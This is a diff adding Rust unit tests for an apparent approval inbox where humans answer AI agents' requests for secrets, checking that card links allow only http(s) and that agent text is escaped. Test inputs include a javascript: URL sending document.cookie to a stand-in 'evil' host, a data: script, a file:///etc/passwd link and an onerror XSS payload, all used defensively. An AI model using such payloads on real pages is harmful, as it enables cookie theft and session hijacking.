@@ -428,6 +428,41 @@ mod tests {
         assert_eq!(csrf_field("\"><script>"), "<input type=hidden name=t value=\"&quot;&gt;&lt;script&gt;\">");
     }
 
+    fn card(url: Option<&str>, why: &str) -> Task {
+        Task {
+            id: "t_abc123".into(), kind: TaskKind::Secret, project: "/tmp/p".into(), agent: "agent".into(),
+            name: Some("OPENAI_API_KEY".into()), identity: "default".into(), title: "OpenAI API key".into(),
+            why: Some(why.into()), url: url.map(String::from), steps: vec![],
+            expects: "secret".into(), pattern: None, names: vec![], status: TaskStatus::Pending,
+            created: "2026-01-01T00:00:00Z".into(), deadline: "2099-01-01T00:00:00Z".into(),
+            answered_at: None, note: None,
+        }
+    }
+
+    /// The card's link is the one thing on the page the human clicks. A `javascript:` URL
+    /// there would run in the inbox's own origin — the origin whose session approves grants.
+    #[test]
+    fn a_card_link_is_rendered_only_for_http_schemes() {
+        for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
+            let page = page_task(&card(Some(bad), "why"), None, "tok", inbox_auth::Scope::Full);
+            assert!(!page.contains("href='javascript"), "{bad}: {page}");
+            assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
+            assert!(!page.contains("data:text/html"), "{bad}");
+            assert!(!page.contains("Open "), "no link button at all for {bad}");
+        }
+        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, "tok", inbox_auth::Scope::Full);
+        assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
+        assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
+    }
+
+    /// Agent-written text is escaped wherever it lands on the page.
+    #[test]
+    fn agent_written_card_text_cannot_become_markup() {
+        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, "tok", inbox_auth::Scope::Full);
+        assert!(!page.contains("<img src=x"), "{page}");
+        assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
+    }
+
     #[test]
     fn parse_form_reads_the_csrf_field_out_of_a_body() {
         let f = parse_form("value=sk-abc&t=deadbeef&skip_check=1");
